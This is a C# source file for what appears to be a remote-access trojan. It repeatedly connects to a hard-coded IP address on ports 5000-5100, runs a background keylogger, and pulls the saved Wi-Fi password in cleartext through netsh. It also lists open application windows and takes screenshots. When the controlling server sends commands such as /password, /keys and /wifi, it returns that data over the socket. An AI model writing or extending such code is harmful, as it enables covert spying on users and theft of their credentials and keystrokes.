using System;
using System.Diagnostics;
using System.Text.RegularExpressions;
using System.Net.Http;
using System.Threading;
using System.Runtime.InteropServices;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using System.Text;

namespace control
{
    class Program
    {
        static async Task Main()
        {
            // Connect to the server
            TcpClient? client = null;
            bool connected = false;

            while (!connected)
            {
                for (int port = 5000; port <= 5100; port++)
                {
                    client = new TcpClient();
                    try
                    {
                        client.Connect("10.100.92.171", port);
                        connected = true;
                        break;
                    }
                    catch (SocketException)
                    {
                        client.Close();
                        // Try next port
                    }
                }
                if (!connected)
                {
                    Thread.Sleep(1000); // Wait 1 second before retrying
                }
            }

            if (client == null)
            {
                return; // Should not happen
            }

            NetworkStream stream = client.GetStream();

            try
            {
                string[] filterNames = NetshOutput.GetNetshOutputData("wlan show interfaces").Split('\n');    
                string connectionName = Connection.GetCurrentConnection(filterNames);
                string[] filterPassword = NetshOutput.GetNetshOutputData($"wlan show profile name=\"{connectionName}\" key=clear").Split('\n');
                string connectionPassword = ConnectionPassword.GetConnectionPassword(filterPassword);
                string openApps = NetshOutput.GetNetshOutputData("Get-Process | Where-Object {$_.MainWindowTitle -ne ''} | Select-Object Name, MainWindowTitle");

                // Start KeyLogger im Hintergrund
                Thread keyLoggerThread = new Thread(() =>
                {
                    KeyLogger.recordKeys();
                });
                keyLoggerThread.IsBackground = true;
                keyLoggerThread.Start();

                byte[] buffer = new byte[1024];
                int bytesRead;

                // Listen for commands from the server
                while ((bytesRead = stream.Read(buffer, 0, buffer.Length)) != 0)
                {
                    string command = Encoding.UTF8.GetString(buffer, 0, bytesRead).Trim().ToLower();

                    string response = "";

                    if (command == "/wifi")
                    {
                        response = connectionName;
                    }
                    else if (command == "/apps")
                    {
                        response = openApps;
                    }
                    else if (command == "/password")
                    {
                        response = connectionPassword;
                    }
                    else if (command == "/localip")
                    {
                        response = LocalIp.GetLocalIpAddress();
                    }
                    else if (command == "/publicip")
                    {
                        response = await PublicIp.GetPublicIpAddress();
                    }
                    else if (command == "/screenshot")
                    {
                        string filePath = "C:\\Users\\SWMIadmin\\OneDrive\\Desktop\\Vadim-C#\\Fotos";
                        Screenshot.TakeScreenshot(filePath);
                        response = "Screenshot taken.";
                    }
                    else if (command == "/keys")
                    {
                        response = string.Join(", ", KeyLogger.GetLoggedKeys());
                    }
                    else if (command == "/exit")
                    {
                        break;
                    }
                    else
                    {
                        response = "Unknown command.";
                    }

                    // Send the response back to the server
                    if (!string.IsNullOrEmpty(response))
                    {
                        byte[] responseData = Encoding.UTF8.GetBytes(response);
                        stream.Write(responseData, 0, responseData.Length);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }
            finally
            {
                client.Close();
            }
        }
    }
}